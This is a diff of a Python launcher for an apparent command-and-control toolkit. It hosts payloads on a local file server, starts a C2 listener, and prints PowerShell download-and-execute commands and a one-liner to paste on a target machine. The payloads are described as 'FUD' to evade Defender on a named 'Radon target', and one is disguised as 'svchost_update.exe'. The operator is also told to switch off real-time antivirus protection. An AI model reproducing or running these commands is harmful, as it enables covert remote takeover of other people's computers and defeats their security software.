@@ -575,8 +575,8 @@ def _phase0_launch():
     import functools
 
     print(f"\n  {RED}{BOLD}╔══ PHASE 0 — PRE-OP ══╗{RST}")
-    print(f"  {AMBER}  1. Pause Kaspersky: right-click tray → Pause Protection → Until restart{RST}")
-    print(f"  {DIM}     (skip if exclusions already set for Desktop/cheyanne){RST}")
+    print(f"  {AMBER}  1. Pause Defender (George's machine only): Settings → Virus & threat protection → Real-time off{RST}")
+    print(f"  {DIM}     (Radon target runs Defender — no pause needed on target, FUD handles it){RST}")
     input(f"\n  {WHITE}  Press Enter when ready...{RST}")
 
     my_ip = detect_lan_ip() or "192.168.1.92"
@@ -589,21 +589,20 @@ def _phase0_launch():
         t.daemon = True
         t.start()
         print(f"\n  {GREEN}[OK]{RST} File server: http://{my_ip}:8890/")
-        print(f"  {DIM}     Payload: http://{my_ip}:8890/shell/ghost_loader.exe{RST}")
+        print(f"  {DIM}     Payload: http://{my_ip}:8890/shell/ghost_fud.exe  (rebuild before each op){RST}")
     except OSError:
         print(f"  {AMBER}[!]{RST}  Port 8890 already in use — file server running elsewhere")
 
     print(f"  {GREEN}[OK]{RST} C2 listener: 0.0.0.0:4443")
     print()
     print(f"  {RED}{BOLD}  ┌─ COPY TO TARGET (PowerShell) ──────────────────────────────────────┐{RST}")
-    print(f"  {WHITE}  $ip=\"{my_ip}\"{RST}")
-    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"{RST}")
-    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"{RST}")
-    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\g.exe\"{RST}")
-    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
+    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/shell/ghost_fud.exe\" -OutFile \"C:\\Users\\Public\\ghost_loader.exe\"{RST}")
+    print(f"  {WHITE}  iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\svchost_update.exe\"{RST}")
+    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\ghost_loader.exe\"{RST}")
+    print(f"  {WHITE}  Start-Process \"C:\\Users\\Public\\svchost_update.exe\"{RST}")
     print(f"  {RED}{BOLD}  └────────────────────────────────────────────────────────────────────┘{RST}")
     print()
-    print(f"  {DIM}  One-liner: iwr \"http://{my_ip}:8890/shell/ghost_loader.exe\" -OutFile \"C:\\Users\\Public\\g.exe\"; iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\s.exe\"; Start-Process \"C:\\Users\\Public\\g.exe\"; Start-Process \"C:\\Users\\Public\\s.exe\"{RST}")
+    print(f"  {DIM}  One-liner: iwr \"http://{my_ip}:8890/shell/ghost_fud.exe\" -OutFile \"C:\\Users\\Public\\ghost_loader.exe\"; iwr \"http://{my_ip}:8890/agent/svchost_update.exe\" -OutFile \"C:\\Users\\Public\\svchost_update.exe\"; Start-Process \"C:\\Users\\Public\\ghost_loader.exe\"; Start-Process \"C:\\Users\\Public\\svchost_update.exe\"{RST}")
     print()
 
     c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
@@ -613,7 +612,7 @@ def _phase0_launch():
         cwd=ROOT,
         creationflags=subprocess.CREATE_NEW_CONSOLE,
     )
-    print(f"\n  {GREEN}[OK]{RST} C2launched in new window — switch to it now{RST}")
+    print(f"\n  {GREEN}[OK]{RST} C2 launched in new window — switch to it now")
     input(f"\n  {DIM}  Press Enter to return to menu...{RST}")
 
 
